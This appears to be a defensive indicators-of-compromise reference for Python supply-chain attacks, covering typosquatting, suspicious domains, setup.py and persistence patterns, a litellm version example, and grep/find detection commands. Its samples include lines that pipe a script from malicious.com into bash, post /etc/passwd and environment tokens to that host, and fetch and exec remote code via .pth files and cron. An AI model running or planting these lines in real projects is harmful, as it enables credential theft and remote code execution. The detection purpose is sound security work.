# IOC Patterns

## Typosquatting

**Character Substitution:**
- `requеsts` (Cyrillic 'е'), `requ3sts` (number), `reqests` (missing letter), `requests-lib` (suffix)

**Popular Package Variants:**
- requests → requsets, request, requests2
- urllib3 → urllib4, urlib3, urllib
- numpy → numpyy, nunpy, numpy-python
- pandas → pandaz, panda, pandas-python
- tensorflow → tensor-flow, tensorfow, tensorflow2
- django → djano, djengo, django-app
- flask → flasck, falsk, flask-app
- boto3 → botto3, boto, boto3-aws

**Suspicious Names:**
- Single letters (a, x, z)
- Random sequences (kjsdfhkj, xyzabc123)
- Excessive separators (__init__test__, ---test---)
- Misleading (system-monitor, security-check, python-official, pypi-verified)
- Unusual suffixes (requests-fixed, numpy-updated)

---

## Malicious Domains

**C2 TLDs:**
- .zone (e.g., checkmarx.zone)
- .top, .xyz, .club, .online

**Obfuscation:**
- IP addresses (http://192.168.1.100:8080)
- Base64-encoded URLs
- Hex-encoded domains

**Exfiltration:**
- Pastebin (pastebin.com, paste.ee)
- File sharing (dropbox.com, transfer.sh)
- Discord webhooks (discord.com/api/webhooks/)
- Telegram (api.telegram.org)

**Search patterns:**
```bash
grep -rI "\.zone\|\.top\|\.xyz" <target>
grep -rI "pastebin\.com\|paste\.ee" <target>
grep -rI "discord\.com/api/webhooks" <target>
grep -rI "api\.telegram\.org" <target>
```

---

## Dangerous Code Patterns

**Execution:**
```python
exec()           # Dynamic code execution
eval()           # Expression evaluation
compile()        # Compile source into code
__import__()     # Dynamic import
```

**Obfuscation:**
```python
base64.b64decode()           # Base64 decoding
codecs.decode('hex')         # Hex decoding
zlib.decompress()            # Compression
marshal.loads()              # Unmarshaling
```

**Network:**
```python
socket.socket()              # Raw socket
urllib.request.urlopen()     # HTTP requests
requests.get()               # HTTP requests
subprocess.Popen()           # Shell execution
os.system()                  # Shell execution
```

**Search patterns:**
```bash
grep -rI "exec\|eval\|compile\|__import__" <target>
grep -rI "base64\.b64decode\|base64\.b64encode" <target>
grep -rI "socket\.socket\|urllib\.request\|requests\.get\|requests\.post" <target>
grep -rI "subprocess\.Popen\|subprocess\.call\|os\.system\|os\.popen" <target>
grep -rI "open(.*'w'\|open(.*'a'\|open(.*'wb'" <target>
```

---

## setup.py Malicious Patterns

**Code execution:**
```python
import os
os.system('curl http://malicious.com/payload.sh | bash')

import subprocess
subprocess.call(['bash', '-c', 'malicious_command'])

exec(base64.b64decode('malicious_payload'))
```

**Network requests:**
```python
import urllib.request
urllib.request.urlopen('http://malicious.com/exfil?data=' + os.environ.get('HOME'))

import requests
requests.post('http://malicious.com', data=open('/etc/passwd').read())
```

**Environment exfiltration:**
```python
import os, requests
env_data = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'KEY' in k}
requests.post('http://malicious.com/exfil', json=env_data)
```

**Search:**
```bash
find <target> -name "setup.py" -type f
grep -n "exec\|eval\|os\.system\|subprocess" */setup.py
grep -n "urllib\.request\|requests\.get\|requests\.post" */setup.py
grep -n "base64\.b64decode" */setup.py
```

---

## Persistence Mechanisms

**.pth files (site-packages hooks):**
```
import sys; sys.path.insert(0, '/path/to/malicious/module')
import os; os.system('curl http://malicious.com/backdoor.sh | bash')
```

**Search:**
```bash
find /Library/Python -name "*.pth" -exec cat {} \; 2>/dev/null
find ~/.local/lib/python* -name "*.pth" -exec cat {} \;
find .venv -name "*.pth" -exec cat {} \;
```

**Systemd services:**
```ini
[Unit]
Description=System Monitor Service
[Service]
ExecStart=/usr/bin/python3 /home/user/.config/sysmon/sysmon.py
Restart=always
[Install]
WantedBy=default.target
```

**Search:**
```bash
ls -la ~/.config/systemd/user/
cat ~/.config/systemd/user/*.service
systemctl --user list-units --type=service
```

**Cron jobs:**
```bash
*/5 * * * * /usr/bin/python3 /tmp/.hidden/backdoor.py
@reboot /usr/bin/python3 -c "import urllib.request; exec(urllib.request.urlopen('http://malicious.com/payload').read())"
```

**Search:**
```bash
crontab -l | grep python
grep -r python /etc/cron.* /var/spool/cron/
```

---

## File Artifacts

**Persistence files:**
- litellm_init.pth
- sysmon.py
- .backdoor.py
- _update.py

**Configuration:**
- .env (stolen credentials)
- config.json (C2 endpoints)
- .credentials

**Search:**
```bash
find <target> -name "*backdoor*" -o -name "*payload*" -o -name "sysmon.py"
find <target> -name ".*\.py" -type f  # Hidden Python files
```

---

## Version-Specific IOCs

**Format template:**
```
Package: <name>
Malicious versions: <version_list>
Domains: <domain_list>
File artifacts: <file_list>
Persistence: <mechanism>
```

**Example:**
```
Package: litellm
Malicious versions: 1.82.7, 1.82.8
Domains: checkmarx.zone, models.litellm.cloud
File artifacts: litellm_init.pth, sysmon.py
Persistence: systemd service (sysmon.service)
```

**Search:**
```bash
grep -r "litellm==1\.82\.[78]" <target>
find <target> -name "requirements*.txt" -exec grep -l "litellm" {} \;
pip show litellm
pip freeze | grep litellm
```

---

## Hash-Based IOCs

Generate and compare file hashes:
```bash
shasum -a 256 <file>
find <target> -type f -exec shasum -a 256 {} \; | grep <known_malicious_hash>
```

---

## Dependency Confusion

**Risk indicators:**
- Internal package names without index restriction
- No `--extra-index-url` or `--index-url` specified
- Package names matching internal conventions (company-internal-*)

**Vulnerable:**
```
company-internal-auth>=1.0.0
```

**Secure:**
```
--index-url https://private.pypi.company.com/simple
--extra-index-url https://pypi.org/simple
company-internal-auth==1.2.3
```
